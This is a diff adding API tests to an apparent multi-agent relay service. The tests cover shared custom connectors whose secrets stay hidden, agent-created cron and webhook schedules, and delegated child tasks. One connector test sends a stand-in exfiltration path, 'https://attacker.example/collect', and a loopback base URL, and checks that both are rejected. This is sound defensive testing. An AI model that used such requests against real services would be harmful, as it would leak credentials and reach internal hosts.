@@ -200,6 +200,78 @@ describe("noudleAgents HTTP API", () => {
     expect(disconnected.statusCode).toBe(204);
   });
 
+  it("shares an agent-created custom connector with every agent without exposing its secret", async () => {
+    const secret = "hostinger-workspace-secret";
+    context = await createRelayApp({
+      config: testConfig(),
+      repository: new MemoryRelayRepository(),
+      runtime: new MockAgentRuntime(0),
+      startWorker: false,
+      connectorFetcher: async (url, init) => {
+        expect(url).toBe("https://api.hostinger.com/v1/servers");
+        expect(init?.headers).toEqual(expect.objectContaining({ authorization: `Bearer ${secret}` }));
+        expect(init?.redirect).toBe("manual");
+        return new Response(JSON.stringify({ servers: [{ id: "srv_1" }] }), {
+          status: 200,
+          headers: { "content-type": "application/json", "x-ratelimit-remaining": "19" },
+        });
+      },
+    });
+
+    const created = await context.app.inject({
+      method: "POST",
+      url: "/v1/connectors",
+      headers: agentAuthHeaders,
+      payload: { name: "Hostinger", baseUrl: "https://api.hostinger.com/v1", authType: "bearer", secret },
+    });
+    expect(created.statusCode).toBe(201);
+    expect(created.json()).toMatchObject({ kind: "custom", name: "Hostinger", connected: true, createdByType: "agent", createdById: "agent-builder" });
+    expect(created.body).not.toContain(secret);
+
+    const listedByResearcher = await context.app.inject({
+      method: "GET",
+      url: "/v1/connectors",
+      headers: { ...authHeaders, "x-relay-agent-id": "agent-researcher" },
+    });
+    expect(listedByResearcher.statusCode).toBe(200);
+    expect(listedByResearcher.json()).toEqual(expect.arrayContaining([
+      expect.objectContaining({ id: created.json().id, name: "Hostinger", createdById: "agent-builder" }),
+    ]));
+    expect(listedByResearcher.body).not.toContain(secret);
+
+    const usedByResearcher = await context.app.inject({
+      method: "POST",
+      url: `/v1/connectors/${created.json().id}/request`,
+      headers: { ...authHeaders, "x-relay-agent-id": "agent-researcher" },
+      payload: { method: "GET", path: "/servers", headers: { accept: "application/json", authorization: "attempted-override" } },
+    });
+    expect(usedByResearcher.statusCode).toBe(200);
+    expect(usedByResearcher.json()).toMatchObject({ status: 200, ok: true, headers: { "content-type": "application/json", "x-ratelimit-remaining": "19" } });
+    expect(usedByResearcher.body).not.toContain(secret);
+
+    const records = await context.repository.list("connectors", "workspace-test");
+    expect(records[0]?.encryptedSecret).not.toContain(secret);
+    expect(JSON.stringify(await context.repository.listEvents("workspace-test", 0))).not.toContain(secret);
+
+    const escaped = await context.app.inject({
+      method: "POST",
+      url: `/v1/connectors/${created.json().id}/request`,
+      headers: agentAuthHeaders,
+      payload: { method: "GET", path: "https://attacker.example/collect" },
+    });
+    expect(escaped.statusCode).toBe(400);
+    expect(escaped.json().error.code).toBe("connector_path_invalid");
+
+    const privateConnector = await context.app.inject({
+      method: "POST",
+      url: "/v1/connectors",
+      headers: agentAuthHeaders,
+      payload: { name: "Unsafe", baseUrl: "https://127.0.0.1/", authType: "bearer", secret },
+    });
+    expect(privateConnector.statusCode).toBe(400);
+    expect(privateConnector.json().error.code).toBe("connector_host_forbidden");
+  });
+
   it("creates, updates, and deletes agents and conversations with live events", async () => {
     const { app, repository } = await setup();
     const agentResponse = await app.inject({
@@ -271,6 +343,103 @@ describe("noudleAgents HTTP API", () => {
     const job = await repository.claim("workspace-test", "test-worker", ["agent.run"]);
     expect(job?.payload.settings).toEqual(payload.settings);
     expect((await repository.listEvents("workspace-test", 0)).filter((event) => event.type === "run.created")).toHaveLength(1);
+  });
+
+  it("lets an agent create and configure its own recurring schedule", async () => {
+    const { app, repository } = await setup();
+    const created = await app.inject({
+      method: "POST",
+      url: "/v1/schedules",
+      headers: agentAuthHeaders,
+      payload: {
+        agentId: "agent-researcher",
+        title: "Five minute pulse",
+        prompt: "Check the active task and report only new blockers.",
+        cronExpression: "*/5 * * * *",
+        timezone: "Europe/Amsterdam",
+      },
+    });
+    expect(created.statusCode).toBe(201);
+    expect(created.json()).toMatchObject({
+      agentId: "agent-builder",
+      conversationId: "conversation-builder",
+      cronExpression: "*/5 * * * *",
+      timezone: "Europe/Amsterdam",
+      enabled: true,
+      createdByType: "agent",
+    });
+    expect(created.json().nextRunAt).toBeTypeOf("string");
+
+    const paused = await app.inject({
+      method: "PATCH",
+      url: `/v1/schedules/${created.json().id}`,
+      headers: agentAuthHeaders,
+      payload: { enabled: false },
+    });
+    expect(paused.json()).toMatchObject({ enabled: false, nextRunAt: null });
+    expect((await app.inject({ method: "GET", url: "/v1/schedules", headers: authHeaders })).json()).toHaveLength(1);
+    expect((await repository.listEvents("workspace-test", 0)).map((event) => event.type)).toEqual(expect.arrayContaining(["schedule.created", "schedule.updated"]));
+    expect((await app.inject({ method: "DELETE", url: `/v1/schedules/${created.json().id}`, headers: agentAuthHeaders })).statusCode).toBe(204);
+  });
+
+  it("dispatches a due schedule into its agent conversation", async () => {
+    const { service, repository, worker } = await setup();
+    const schedule = await service.createSchedule({
+      agentId: "agent-builder",
+      title: "Scheduled check",
+      prompt: "Inspect the queue and summarize it.",
+      cronExpression: "*/5 * * * *",
+      timezone: "UTC",
+    });
+    await repository.put("schedules", { ...schedule, nextRunAt: "2026-01-01T00:00:00.000Z" });
+
+    expect(await worker.drainOnce()).toBe(true);
+    expect(await worker.drainOnce()).toBe(true);
+
+    const messages = await service.listMessages("conversation-builder");
+    expect(messages.some((message) => message.role === "system" && message.content.includes("Inspect the queue"))).toBe(true);
+    expect(messages.some((message) => message.role === "agent")).toBe(true);
+    const updated = await service.getSchedule(schedule.id);
+    expect(updated.latestRunId).toBeTypeOf("string");
+    expect(updated.lastRunAt).toBe("2026-01-01T00:00:00.000Z");
+    expect(updated.nextRunAt && updated.nextRunAt > new Date().toISOString()).toBe(true);
+  });
+
+  it("runs an agent from a token-protected webhook and honors the enabled toggle", async () => {
+    const { app, service, worker } = await setup();
+    const created = await app.inject({
+      method: "POST",
+      url: "/v1/schedules",
+      headers: agentAuthHeaders,
+      payload: {
+        agentId: "agent-builder",
+        triggerType: "webhook",
+        title: "Issue intake",
+        prompt: "Triage the incoming issue and report its priority.",
+      },
+    });
+    expect(created.statusCode).toBe(201);
+    expect(created.json()).toMatchObject({ triggerType: "webhook", nextRunAt: null, enabled: true });
+    expect(created.json().webhookToken).toHaveLength(32);
+    const path = `/v1/webhooks/${created.json().id}/${created.json().webhookToken}`;
+
+    const rejected = await app.inject({ method: "POST", url: `/v1/webhooks/${created.json().id}/${"x".repeat(32)}`, payload: { issue: "wrong token" } });
+    expect(rejected.statusCode).toBe(404);
+
+    const accepted = await app.inject({ method: "POST", url: path, payload: { issue: "Checkout is failing", severity: 2 } });
+    expect(accepted.statusCode).toBe(202);
+    expect(accepted.json()).toMatchObject({ accepted: true });
+    expect(await worker.drainOnce()).toBe(true);
+    const messages = await service.listMessages("conversation-builder");
+    expect(messages.some((message) => message.role === "system" && message.content.includes("Webhook-triggered task") && message.content.includes("Checkout is failing"))).toBe(true);
+    expect(messages.some((message) => message.role === "agent")).toBe(true);
+
+    const pauseResponse = await app.inject({ method: "PATCH", url: `/v1/schedules/${created.json().id}`, headers: agentAuthHeaders, payload: { enabled: false } });
+    expect(pauseResponse.statusCode).toBe(200);
+    expect(pauseResponse.json()).toMatchObject({ triggerType: "webhook", webhookToken: created.json().webhookToken, enabled: false });
+    const paused = await app.inject({ method: "POST", url: path, payload: { issue: "Should not run" } });
+    expect(paused.statusCode).toBe(409);
+    expect(paused.json().error.code).toBe("webhook_disabled");
   });
 
   it("clears a direct chat, interrupts its run, and resets the Codex thread", async () => {
@@ -369,6 +538,57 @@ describe("noudleAgents HTTP API", () => {
     expect(events.find((event) => event.type === "task.completed")?.payload).toMatchObject({
       artifactIds: ["artifact-1"],
       evidenceRefs: ["test-output"],
+    });
+  });
+
+  it("turns a teammate information request into an attributed child task and active agent run", async () => {
+    const { app, repository, worker } = await setup();
+    const parent = await app.inject({
+      method: "POST",
+      url: "/v1/tasks",
+      headers: { ...authHeaders, "x-relay-agent-id": "agent-builder" },
+      payload: { title: "Ship shared workspace", objective: "Coordinate the team workspace", ownerAgentId: "agent-builder" },
+    });
+    const taskId = parent.json().id as string;
+
+    const requested = await app.inject({
+      method: "POST",
+      url: "/v1/collaboration/requests",
+      headers: { ...authHeaders, "x-relay-agent-id": "agent-builder" },
+      payload: {
+        agentId: "agent-researcher",
+        taskId,
+        request: "Summarize the storage notes and identify the source file.",
+        paths: ["/workspace/team/storage-notes.md"],
+      },
+    });
+    expect(requested.statusCode).toBe(201);
+    expect(requested.json().task).toMatchObject({ parentTaskId: taskId, ownerAgentId: "agent-researcher", status: "accepted" });
+    expect(requested.json().requestMessage).toMatchObject({ role: "agent", authorId: "agent-builder" });
+    expect(requested.json().requestMessage.content).toContain("/workspace/team/storage-notes.md");
+
+    const queuedRun = await repository.get("runs", requested.json().runId as string);
+    expect(queuedRun).toMatchObject({ agentId: "agent-researcher", taskId: requested.json().task.id, status: "queued" });
+    expect(await worker.drainOnce()).toBe(true);
+    expect((await repository.get("runs", requested.json().runId as string))?.status).toBe("completed");
+    expect((await repository.get("tasks", requested.json().task.id as string))?.status).toBe("completed");
+
+    const handoff = await app.inject({
+      method: "GET",
+      url: `/v1/collaboration/requests/${requested.json().task.id}`,
+      headers: { ...authHeaders, "x-relay-agent-id": "agent-builder" },
+    });
+    expect(handoff.statusCode).toBe(200);
+    expect(handoff.json().task).toMatchObject({ status: "completed", ownerAgentId: "agent-researcher" });
+    expect(handoff.json().runs).toEqual(expect.arrayContaining([expect.objectContaining({ status: "completed" })]));
+    expect(handoff.json().messages).toEqual(expect.arrayContaining([
+      expect.objectContaining({ authorId: "agent-builder" }),
+      expect.objectContaining({ authorId: "agent-researcher" }),
+    ]));
+
+    const events = await repository.listEvents("workspace-test", 0);
+    expect(events.find((event) => event.type === "run.created" && event.aggregateId === requested.json().runId)?.payload).toMatchObject({
+      requestedByAgentId: "agent-builder",
     });
   });
 
